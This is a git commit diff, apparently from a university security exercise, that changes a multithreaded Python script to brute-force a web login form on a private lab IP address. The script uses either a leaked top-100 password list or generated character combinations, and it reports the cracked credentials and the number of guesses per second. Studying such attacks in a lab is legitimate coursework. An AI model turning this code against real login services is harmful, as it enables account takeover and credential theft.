5ec420f94c8868697b5d4a74ebfa583991c37fce
MSommer95 <maximilian.sommer@stud.hshl.de>
2019-03-28 23:01:42 +0100

    fifth. commit

--- Blatt-1-Aufgabe-3.py
+++ Blatt-1-Aufgabe-3.py
@@ -3,8 +3,11 @@ import itertools
 import requests
 from multiprocessing.dummy import Pool as ThreadPool
 import time
+from threading import Lock
 
-pool = ThreadPool(128)
+lock = Lock()
+
+pool = ThreadPool(int(input('Wähle eine Pool Größe für die Multithreads: ')))
 user_input = input('Nutzername: ')
 user_array = ['bob', 'ute', 'paul']
 combination_array = []
@@ -40,26 +43,27 @@ def combine_profil(user_list, combination_list):
             combined.append('Profil ' + user_list[i] +' ' + str(j) + ' : ' + ''.join(combination_list[j]))
             print(''.join(combination_list[j]))
 
-    with open('combination_list.txt', 'w') as filehandle:
-        for listitem in combined:
-            filehandle.write('%s\n' % listitem)
+    #with open('combination_list.txt', 'w') as filehandle:
+        #for listitem in combined:
+            #filehandle.write('%s\n' % listitem)
 
 
 url = 'http://172.50.1.5:8080/validate?'
 
 test_key_counter = []
 
+
 def execute_hack(x):
     combinations = combination_array
     global test_key_counter
     if user_input == 'joe':
-        #print('Versuchsnummer: ' + str(x) + ' key: ' + passwords[x])
+        print('Key: ' + passwords[x])
         data = {
             'benutzername': user_input,
             'passwort': passwords[x]
         }
         r = session.post(url, data=data, stream=True)
-        test_key_counter.append('k')
+        #test_key_counter.append('k')
         if r.text != 'Benutzername oder Passwort falsch!':
             print('Versuchsnummer: ' + str(x))
             print(user_input + ' ' + passwords[x])
@@ -68,16 +72,17 @@ def execute_hack(x):
             print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
             print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
             print('Getestete Keys: ' + str(len(test_key_counter)))
-            pool.terminate()
 
     else:
 
-        #print('Versuchsnummer: ' + str(x))
         data = {
             'benutzername': user_input,
             'passwort': ''.join(combinations[x])
         }
         r = session.post(url, data=data, stream=True)
+        #lock.acquire()
+        #print('Key: ' + ''.join(combinations[x]) + '\r')
+        #lock.release()
         test_key_counter.append('k')
         if r.text != 'Benutzername oder Passwort falsch!':
             print('Versuchsnummer: ' + str(x))
@@ -86,10 +91,11 @@ def execute_hack(x):
             elapsed_time = time.time() - start_time
             print('Gebrauchte Zeit zum Knacken: ' + str(elapsed_time))
             print('Getestete Keys pro Sekunde: ' + str(len(test_key_counter)/elapsed_time))
+            print('Getestete Keys pro Sekunde: ' + str(x / elapsed_time))
             print('Getestete Keys: ' + str(len(test_key_counter)))
 
-            pool.terminate()
-    print(len(test_key_counter))
+    #print(len(test_key_counter))
+
 
 if user_input != 'joe':
     password_length = int(input('Wie lang soll das Passwort sein? '))
@@ -108,12 +114,12 @@ if user_input != 'joe':
 #execute_hack(combination_array)
 passwords = []
 f = open('adobe-top100.txt', 'r')
-for line in f:
-    line = line.strip()
-    columns = line.split()
-    passwords.append(columns[3])
+#for line in f:
+#    line = line.strip()
+#    columns = line.split()
+#    passwords.append(columns[3])
 
-f.close()
+#f.close()
 start_time = time.time()
 
 if user_input == 'joe':
@@ -122,3 +128,6 @@ else:
     range_iteration = range(len(combination_array))
 
 results_for = pool.map(execute_hack, range_iteration)
+
+pool.close()
+pool.join()
